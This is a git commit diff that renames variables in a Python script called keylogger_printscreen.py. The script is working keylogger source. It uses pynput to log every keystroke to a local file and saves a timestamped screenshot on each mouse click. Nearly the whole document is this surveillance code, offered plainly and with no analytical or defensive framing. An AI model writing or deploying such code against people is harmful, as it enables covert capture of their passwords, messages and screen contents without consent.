dcd08c4f567322c327fec0c3ae05a1cba65fe3c1
Rafael KozAnd <rafandreola@hotmail.com>
2023-04-18 18:57:44 -0300

    .

--- Code/PrintScreen/keylogger_printscreen.py
+++ Code/PrintScreen/keylogger_printscreen.py
@@ -3,40 +3,40 @@ from pynput.keyboard import Listener as KeyboardListener
 from datetime import datetime
 import re, os, pyautogui as py
 
-dataAtual = datetime.now()
-data = dataAtual.strftime("%d-%m")
-diretorioRaiz = "../screen/keylogger_" + data + "/"
-arquivoLog = diretorioRaiz + "keylogger.log"
+dateTime = datetime.now()
+date = dateTime.strftime("%d-%m")
+dirRaiz = "../screen/keylogger_" + date + "/"
+fileLog = dirRaiz + "keylogger.log"
 
 try:
-    os.mkdir(diretorioRaiz)
+    os.mkdir(dirRaiz)
 except:
     pass
 
-def on_press(tecla):
-    tecla = str(tecla)
-    tecla = re.sub(r'\'', '', tecla)
-    tecla = re.sub(r'Key.space', ' ', tecla)
-    tecla = re.sub(r'Key.enter', '\n', tecla)
-    tecla = re.sub(r'Key.tab', '\t', tecla)
-    tecla = re.sub(r'Key.backspace', 'apagar', tecla)
-    tecla = re.sub(r'Key.*', '', tecla)
-    with open(arquivoLog, 'a') as log:
-        if str(tecla) == str("apagar"):
-            if os.stat(arquivoLog).st_size != 0:
-                tecla = re.sub(r'Key.backspace', '', tecla)
+def on_press(key):
+    key = str(key)
+    key = re.sub(r'\'', '', key)
+    key = re.sub(r'Key.space', ' ', key)
+    key = re.sub(r'Key.enter', '\n', key)
+    key = re.sub(r'Key.tab', '\t', key)
+    key = re.sub(r'Key.backspace', 'apagar', key)
+    key = re.sub(r'Key.*', '', key)
+    with open(fileLog, 'a') as log:
+        if str(key) == str("apagar"):
+            if os.stat(fileLog).st_size != 0:
+                key = re.sub(r'Key.backspace', '', key)
                 log.seek(0,2)
                 caractere = log.tell()
                 log.truncate(caractere - 1)
         else:
-            log.write(tecla)
+            log.write(key)
 
 def on_click(x, y, buttom, pressed):
     if pressed:
-        minhaPrint = py.screenshot()
-        hora = datetime.now()
-        horarioPrint = hora.strftime("%H:%M:%S")
-        minhaPrint.save(os.path.join(diretorioRaiz, "printKeylogger_" + horarioPrint + ".jpg"))
+        safePrint = py.screenshot()
+        hour = datetime.now()
+        timePrint = hour.strftime("%H:%M:%S")
+        safePrint.save(os.path.join(dirRaiz, "printKeylogger_" + timePrint + ".jpg"))
 
 keyboardListener = KeyboardListener(on_press=on_press)
 mouseListener = MouseListener(on_click=on_click)
